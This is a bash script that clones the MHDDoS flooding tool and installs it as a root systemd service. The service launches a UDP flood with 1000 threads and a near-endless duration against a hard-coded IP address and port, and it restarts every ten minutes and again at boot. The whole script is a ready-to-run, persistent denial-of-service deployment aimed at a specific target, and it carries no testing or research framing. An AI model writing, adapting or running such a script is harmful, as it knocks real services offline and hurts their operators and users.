#!/bin/bash

# 1. Update and install all necessary system tools
sudo apt -y update
sudo apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake \
automake autoconf m4 build-essential git -y

# 2. Setup MHDDoS in the /root directory
cd /root
rm -rf MHDDoS
git clone https://github.com/MatrixTM/MHDDoS.git
cd MHDDoS/

# 3. Install requirements (using the break-packages flag for modern Ubuntu)
pip3 install -r requirements.txt --break-system-packages

# 4. Create the systemd service file
# Note: Using /usr/bin/python3 and absolute paths for stability
cat <<EOF | sudo tee /etc/systemd/system/mhddos.service
[Unit]
Description=MHDDoS Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/MHDDoS
ExecStart=/usr/bin/python3 start.py UDP 40.160.20.9:16261 1000 99999999999
Restart=always
# This triggers the restart every 10 minutes
RuntimeMaxSec=10min

[Install]
WantedBy=multi-user.target
EOF

# 5. Reload systemd, enable the service for boot, and start it now
sudo systemctl daemon-reload
sudo systemctl enable mhddos.service
sudo systemctl restart mhddos.service

echo "------------------------------------------------"
echo "MHDDoS is now set up and running."
echo "Check logs with: journalctl -u mhddos.service -f"
